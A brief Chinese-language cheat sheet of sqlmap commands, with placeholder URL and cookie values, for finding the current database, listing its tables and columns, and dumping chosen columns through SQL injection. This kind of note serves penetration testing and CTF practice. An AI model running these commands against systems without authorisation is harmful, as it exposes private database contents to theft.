# sqlmap指令

1. 扫描数据库名，用于获取数据库的名称

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" --current-db
   ```

2. 扫描本数据库的表

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> --tables
   ```

3. 扫描数据库表的列

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> -T <table> --columns
   ```

4. 获取数据库表中列的信息

   ```bash
   sqlmap -u "<url>" --cookie="<cookie value>" -D <Database> -T <table> -C <column1>,<column2>,... --dump
   ```

   